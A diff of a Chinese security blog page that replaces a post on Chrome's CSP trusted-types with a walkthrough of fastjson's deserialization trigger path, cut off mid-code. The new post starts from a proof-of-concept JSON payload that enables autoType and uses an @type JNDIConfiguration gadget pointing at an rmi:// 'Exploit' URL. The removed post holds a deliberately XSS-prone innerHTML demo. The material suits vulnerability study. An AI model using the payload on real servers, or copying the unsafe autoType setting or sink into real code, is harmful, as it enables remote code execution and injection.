@@ -115,24 +115,36 @@
 
 
 
-  <meta name="keywords" content="前端安全">
+  <meta name="keywords" content="漏洞分析,Java">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CSP:trusted-types 初体验">
-<meta property="og:url" content="http://0day.design/2020/01/14/CSPtrusted-types 初体验/index.html">
+<meta property="og:title" content="fastjson 触发流程分析">
+<meta property="og:url" content="http://0day.design/2020/01/30/fastjson 触发流程分析/index.html">
 <meta property="og:site_name" content="Passer6y&#39;s Blog">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://i.loli.net/2020/01/14/BpweX4RQ1CZAW3g.jpg">
-<meta property="og:image" content="https://i.loli.net/2020/01/14/noSBxectQUGKXjp.jpg">
-<meta property="og:image" content="https://i.loli.net/2020/01/14/XVCrkMn9Sjt5hqw.jpg">
-<meta property="og:image" content="https://i.loli.net/2020/01/14/KblJWSctxfqOByX.jpg">
-<meta property="og:image" content="https://i.loli.net/2020/01/15/bt3xTEq5dGWmU8N.jpg">
-<meta property="og:image" content="https://i.loli.net/2020/01/14/chTDAemO3dyiVjP.jpg">
-<meta property="og:image" content="https://i.loli.net/2020/01/14/PRvEKkwYAepyD75.jpg">
-<meta property="og:image" content="https://i.loli.net/2020/01/14/UIfsWblVG7FQO6T.jpg">
-<meta property="og:updated_time" content="2020-01-20T05:14:49.579Z">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/RXP8vCsbhZxENJI.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/Epokz5jByTlsZaU.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/WuZkJBNVDYFEo1q.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/h3d54wMBKY2H79i.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/2TtSQelf7FjwcMi.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/QjY8JUBPR3Gy9Ov.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/U5ZnBIWNpaJcRML.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/LjTFdu3U9MaNCAR.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/ty3MHIwfaiUeLh4.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/zNo5at2C4mIVg76.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/QOPUioYxEuazBt5.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/rviTXqeoKPaSu1L.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/K3yRaC2j5d8NevY.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/7mnQw85gfROMXtK.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/BAOfhFbjIvLrGCK.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/1bo9zxstH7ZBy6i.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/9aYVRGiBZpuOS3j.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/F1MEuN7wkjWIRvD.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/VokgwfIMrGZc39W.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/30/eCJrQWjnTwyVZIU.jpg">
+<meta property="og:updated_time" content="2020-01-30T08:07:15.637Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CSP:trusted-types 初体验">
-<meta name="twitter:image" content="https://i.loli.net/2020/01/14/BpweX4RQ1CZAW3g.jpg">
+<meta name="twitter:title" content="fastjson 触发流程分析">
+<meta name="twitter:image" content="https://i.loli.net/2020/01/30/RXP8vCsbhZxENJI.jpg">
 
 
 
@@ -141,7 +153,7 @@
 
 
 
-  <link rel="canonical" href="http://0day.design/2020/01/14/CSPtrusted-types 初体验/"/>
+  <link rel="canonical" href="http://0day.design/2020/01/30/fastjson 触发流程分析/"/>
 
 
 
@@ -151,7 +163,7 @@
   };
 </script>
 
-  <title>CSP:trusted-types 初体验 | Passer6y's Blog</title>
+  <title>fastjson 触发流程分析 | Passer6y's Blog</title>
   
 
 
@@ -397,7 +409,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://0day.design/2020/01/14/CSPtrusted-types 初体验/">
+    <link itemprop="mainEntityOfPage" href="http://0day.design/2020/01/30/fastjson 触发流程分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Passer6y">
@@ -414,7 +426,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">CSP:trusted-types 初体验
+          <h1 class="post-title" itemprop="name headline">fastjson 触发流程分析
               
             
           </h1>
@@ -439,24 +451,12 @@
                 
               
 
-              <time title="Created: 2020-01-14 20:30:00" itemprop="dateCreated datePublished" datetime="2020-01-14T20:30:00+08:00">2020-01-14</time>
+              <time title="Created: 2020-01-30 16:05:00 / Modified: 16:07:15" itemprop="dateCreated datePublished" datetime="2020-01-30T16:05:00+08:00">2020-01-30</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2020-01-20 13:14:49" itemprop="dateModified" datetime="2020-01-20T13:14:49+08:00">2020-01-20</time>
               
             
           </span>
@@ -488,8 +488,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2020/01/14/CSPtrusted-types 初体验/#comments" itemprop="discussionUrl">
-                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2020/01/14/CSPtrusted-types 初体验/" itemprop="commentCount"></span>
+                <a href="/2020/01/30/fastjson 触发流程分析/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2020/01/30/fastjson 触发流程分析/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -519,21 +519,43 @@
       
         <hr>
 <a id="more"></a>
-<p>文章首发<a href="https://xz.aliyun.com/t/7108" target="_blank" rel="noopener">先知社区</a></p>
-<p>之前被问到这样一个有意思的问题，为什么新版Chrome取消了XSS Audit机制？</p>
-<p>以前<a href="https://zhuanlan.zhihu.com/p/74288648" target="_blank" rel="noopener">看到过文章</a>说新版Chrome取消这个的原因是因为被绕过的姿势过多(我也不知道几个)或者说是误报影响到正常功能了。并说用<code>trusted-types</code>的API替换<code>XSS Audit</code>能彻底杜绝<code>DOM XSS</code>。</p>
-<p>仔细跟了一下<a href="https://developers.google.com/web/updates/2019/02/trusted-types" target="_blank" rel="noopener">谷歌的开发文档介绍</a>，通过给CSP配置一个<code>trusted-types</code>属性：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: trusted-types *</span><br></pre></td></tr></table></figure></p>
-<p>本地测试79.0版本：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Security-Policy: trusted-types *"</span>);</span><br><span class="line">$a= <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">const templateId = location.hash.match(/tplid=([^;&amp;]*)/)[1];</span></span><br><span class="line"><span class="string">// typeof templateId == "string"</span></span><br><span class="line"><span class="string">document.head.innerHTML += decodeURI(templateId) // Throws a TypeError.</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2020/01/14/BpweX4RQ1CZAW3g.jpg" alt="-w1031"></p>
-<p>但是并没有抛出错误，继续翻了下文档，找到问题所在:<br><img src="https://i.loli.net/2020/01/14/noSBxectQUGKXjp.jpg" alt="-w1022"><br>需要用Chrome73-78的版本，其次默认配置是不开的，访问<code>chrome://flags/#enable-experimental-web-platform-features</code>将其配置打开。</p>
-<p>这里用Chrome78测试：<br><img src="https://i.loli.net/2020/01/14/XVCrkMn9Sjt5hqw.jpg" alt="-w838"></p>
-<p><img src="https://i.loli.net/2020/01/14/KblJWSctxfqOByX.jpg" alt="-w1258"></p>
-<p>抛出一个错误，强制要求我们使用<code>TrustedHTML</code>，修改代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Security-Policy: trusted-types *"</span>);</span><br><span class="line">$a= <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">const templatePolicy = TrustedTypes.createPolicy('template', &#123;</span></span><br><span class="line"><span class="string">    createHTML: (templateId) =&gt; &#123;</span></span><br><span class="line"><span class="string">      const tpl = templateId;</span></span><br><span class="line"><span class="string">      if (/^[0-9a-z-]$/.test(tpl)) &#123;</span></span><br><span class="line"><span class="string">        return `&lt;link rel="stylesheet" href="./templates/\$&#123;tpl&#125;/style.css"&gt;`;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      throw new TypeError();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const html = templatePolicy.createHTML(location.hash.match(/tplid=([^;&amp;]*)/)[1]);</span></span><br><span class="line"><span class="string">// html instanceof TrustedHTML</span></span><br><span class="line"><span class="string">document.head.innerHTML = html;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></p>
-<p>通过<code>TrustedTypes.createPolicy</code>自定义过滤后，return一个<code>TrustedHTML</code>来满足CSP的可信要求：<br><img src="https://i.loli.net/2020/01/15/bt3xTEq5dGWmU8N.jpg" alt="-w1015"></p>
-<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>在Chrome79下,即使我们开启了<code>Experimental Web Platform features</code>这个配置，仍然会遇到<code>TrustedTypes is not defined</code>的问题，emm可能功能正在试验中，然后新版又给移除了？<br><img src="https://i.loli.net/2020/01/14/chTDAemO3dyiVjP.jpg" alt="-w1046"></p>
-<p>其次因为这个问题测试的时候，Chrome会默认更新到79版本有点烦，去<a href="https://www.chromedownloads.net/chrome64win/" target="_blank" rel="noopener">这里</a>，找了个78版本的下载，接着输<code>msconfig</code>把谷歌服务的更新关了即可<br><img src="https://i.loli.net/2020/01/14/PRvEKkwYAepyD75.jpg" alt="-w1136"><br>最后打开Chrome效果是这样的：<br><img src="https://i.loli.net/2020/01/14/UIfsWblVG7FQO6T.jpg" alt="-w730"></p>
-<p>最后简单总结一下，Chrome取消了XSS Auditor，取而代之的是<code>trusted-types</code>可信API，声称可以彻底杜绝DOM XSS，经过一番体验后，其实本质上为强制开发写一段更为严格的过滤规则。</p>
-<p>拭目以待，看看之后谷歌有什么新的想法~</p>
+<p>跟了几个三方组件组合利用的gadget chain，一直没有去跟fastjson底层实现，不免有很多疑问之处，这里记录一下分析一下fastjson触发流程。</p>
+<p>从poc出发：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String poc = <span class="string">"&#123;\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;"</span>;</span><br><span class="line">        ParserConfig.global.setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSONObject exp = (JSONObject) JSON.parseObject(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>下断点跟进POC中的<code>JSON.parseObject</code>函数：<br><img src="https://i.loli.net/2020/01/30/RXP8vCsbhZxENJI.jpg" alt="-w1427"></p>
+<p>跟进<code>parse(String text)</code>函数，一顿套娃操作(java的重载特性：允许存在相同方法名，但不同参数个数及类型)<br>通过重载的特性，调用了三个<code>parse</code>函数:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 148</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> parse(text, DEFAULT_PARSER_FEATURE);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 179</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(String text, <span class="keyword">int</span> features)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> parse(text, ParserConfig.getGlobalInstance(), features);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 164</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(String text, ParserConfig config, <span class="keyword">int</span> features)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        DefaultJSONParser parser = <span class="keyword">new</span> DefaultJSONParser(text, config, features);</span><br><span class="line">        Object value = parser.parse();</span><br><span class="line">        parser.handleResovleTask(value);</span><br><span class="line">        parser.close();</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>在<code>DefaultJSONParser</code>函数中初始化了一些变量配置信息，确认起始标志位为<code>{</code>：<br><img src="https://i.loli.net/2020/01/30/Epokz5jByTlsZaU.jpg" alt="-w1223"><br><img src="https://i.loli.net/2020/01/30/WuZkJBNVDYFEo1q.jpg" alt="-w789"></p>
+<p>接着进入<code>parser.parse</code>函数，解析json流程:<br><img src="https://i.loli.net/2020/01/30/h3d54wMBKY2H79i.jpg" alt="-w1057"></p>
+<p>跟进DefaultJSONParser.java#parseObject，函数较长，截取部分：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                lexer.skipWhitespace();</span><br><span class="line">                <span class="keyword">char</span> ch = lexer.getCurrent();</span><br><span class="line">                <span class="keyword">if</span> (lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (ch == <span class="string">','</span>) &#123;</span><br><span class="line">                        lexer.next();</span><br><span class="line">                        lexer.skipWhitespace();</span><br><span class="line">                        ch = lexer.getCurrent();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">boolean</span> isObjectKey = <span class="keyword">false</span>;</span><br><span class="line">                Object key;</span><br><span class="line">                <span class="keyword">if</span> (ch == <span class="string">'"'</span>) &#123;</span><br><span class="line">                    key = lexer.scanSymbol(symbolTable, <span class="string">'"'</span>);</span><br><span class="line">                    lexer.skipWhitespace();</span><br><span class="line">                    ch = lexer.getCurrent();</span><br><span class="line">                    <span class="keyword">if</span> (ch != <span class="string">':'</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"expect ':' at "</span> + lexer.pos() + <span class="string">", name "</span> + key);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">'&#125;'</span>) &#123;</span><br><span class="line">                    lexer.next();</span><br><span class="line">                    lexer.resetStringPosition();</span><br><span class="line">                    lexer.nextToken();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!setContextFlag) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.context != <span class="keyword">null</span> &amp;&amp; fieldName == <span class="keyword">this</span>.context.fieldName &amp;&amp; object == <span class="keyword">this</span>.context.object) &#123;</span><br><span class="line">                            context = <span class="keyword">this</span>.context;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            ParseContext contextR = setContext(object, fieldName);</span><br><span class="line">                            <span class="keyword">if</span> (context == <span class="keyword">null</span>) &#123;</span><br><span class="line">                                context = contextR;</span><br><span class="line">                            &#125;</span><br><span class="line">                            setContextFlag = <span class="keyword">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> object;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">'\''</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!lexer.isEnabled(Feature.AllowSingleQuotes)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    key = lexer.scanSymbol(symbolTable, <span class="string">'\''</span>);</span><br><span class="line">                    lexer.skipWhitespace();</span><br><span class="line">                    ch = lexer.getCurrent();</span><br><span class="line">                    <span class="keyword">if</span> (ch != <span class="string">':'</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"expect ':' at "</span> + lexer.pos());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == EOI) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">','</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((ch &gt;= <span class="string">'0'</span> &amp;&amp; ch &lt;= <span class="string">'9'</span>) || ch == <span class="string">'-'</span>) &#123;</span><br><span class="line">                    lexer.resetStringPosition();</span><br><span class="line">                    lexer.scanNumber();</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_INT) &#123;</span><br><span class="line">                            key = lexer.integerValue();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            key = lexer.decimalValue(<span class="keyword">true</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (lexer.isEnabled(Feature.NonStringKeyAsString)) &#123;</span><br><span class="line">                            key = key.toString();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"parse number key error"</span> + lexer.info());</span><br><span class="line">                    &#125;</span><br><span class="line">                    ch = lexer.getCurrent();</span><br><span class="line">                    <span class="keyword">if</span> (ch != <span class="string">':'</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"parse number key error"</span> + lexer.info());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">'&#123;'</span> || ch == <span class="string">'['</span>) &#123;</span><br><span class="line">                    lexer.nextToken();</span><br><span class="line">                    key = parse();</span><br><span class="line">                    isObjectKey = <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!lexer.isEnabled(Feature.AllowUnQuotedFieldNames)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    key = lexer.scanSymbolUnQuoted(symbolTable);</span><br><span class="line">                    lexer.skipWhitespace();</span><br><span class="line">                    ch = lexer.getCurrent();</span><br><span class="line">                    <span class="keyword">if</span> (ch != <span class="string">':'</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"expect ':' at "</span> + lexer.pos() + <span class="string">", actual "</span> + ch);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></p>
+<p>总的来说就是一个大循环，里边嵌套了一堆if else，然后依据类型来判断，直到迭代器遍历完json数据为止，比如下面这个就是检测数字的判断：<br><img src="https://i.loli.net/2020/01/30/2TtSQelf7FjwcMi.jpg" alt="-w994"><br>再比如这里，匹配到双引号，则用<code>lexer.scanSymbol</code>函数去获取双引号中间的值，并设置键名：<br><img src="https://i.loli.net/2020/01/30/QjY8JUBPR3Gy9Ov.jpg" alt="-w1178"></p>
+<p>再来看这里，进行了特殊键<code>@type</code>匹配，并且<code>!lexer.isEnabled(Feature.DisableSpecialKeyDetect)</code>默认也是<code>true</code><br><img src="https://i.loli.net/2020/01/30/U5ZnBIWNpaJcRML.jpg" alt="-w1331"><br><img src="https://i.loli.net/2020/01/30/LjTFdu3U9MaNCAR.jpg" alt="-w900"><br>跟进<code>lexer.scanSymbol(symbolTable, &#39;&quot;&#39;)</code>函数，看看它是如何获取类型名<code>typeName</code>的，JSONLexerBase.java#scanSymbol，同样的，也是一个迭代判断的过程，这里看一段比较有意思的是这一段代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chLocal == <span class="string">'\\'</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!hasSpecial) &#123;</span><br><span class="line">                    hasSpecial = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (sp &gt;= sbuf.length) &#123;</span><br><span class="line">                        <span class="keyword">int</span> newCapcity = sbuf.length * <span class="number">2</span>;</span><br><span class="line">                        <span class="keyword">if</span> (sp &gt; newCapcity) &#123;</span><br><span class="line">                            newCapcity = sp;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">char</span>[] newsbuf = <span class="keyword">new</span> <span class="keyword">char</span>[newCapcity];</span><br><span class="line">                        System.arraycopy(sbuf, <span class="number">0</span>, newsbuf, <span class="number">0</span>, sbuf.length);</span><br><span class="line">                        sbuf = newsbuf;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// text.getChars(np + 1, np + 1 + sp, sbuf, 0);</span></span><br><span class="line">                    <span class="comment">// System.arraycopy(this.buf, np + 1, sbuf, 0, sp);</span></span><br><span class="line">                    arrayCopy(np + <span class="number">1</span>, sbuf, <span class="number">0</span>, sp);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                chLocal = next();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">switch</span> (chLocal) &#123;</span><br><span class="line">                         <span class="comment">// 省略大量case</span></span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'\\'</span>: <span class="comment">// 92</span></span><br><span class="line">                        hash = <span class="number">31</span> * hash + (<span class="keyword">int</span>) <span class="string">'\\'</span>;</span><br><span class="line">                        putChar(<span class="string">'\\'</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'x'</span>:</span><br><span class="line">                        <span class="keyword">char</span> x1 = ch = next();</span><br><span class="line">                        <span class="keyword">char</span> x2 = ch = next();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">int</span> x_val = digits[x1] * <span class="number">16</span> + digits[x2];</span><br><span class="line">                        <span class="keyword">char</span> x_char = (<span class="keyword">char</span>) x_val;</span><br><span class="line">                        hash = <span class="number">31</span> * hash + (<span class="keyword">int</span>) x_char;</span><br><span class="line">                        putChar(x_char);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'u'</span>:</span><br><span class="line">                        